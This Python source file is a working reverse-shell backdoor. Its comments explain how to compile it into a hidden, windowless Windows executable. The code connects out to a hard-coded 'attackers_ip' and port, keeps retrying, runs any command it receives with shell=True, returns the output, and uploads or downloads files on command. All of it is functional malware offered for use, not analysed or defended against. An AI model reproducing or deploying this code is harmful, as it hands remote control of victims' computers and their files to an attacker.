# to run this as exe do(perform the foll. in windows PC):
# pip install pyinstaller
# in terminal: pyinstaller <this_filename>.py --onefile --noconsole
# rm -rf build/ <this_filename>.spec __pycache__/
# the dist folder contains the exe

import socket
import time
import json
import subprocess
import os

attackers_ip ='192.168.1.73'
attackers_port = 5555

def reliable_send(command):
    jsondata = json.dumps(command)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(5)
        try:
            s.connect((attackers_ip, attackers_port))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        if command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
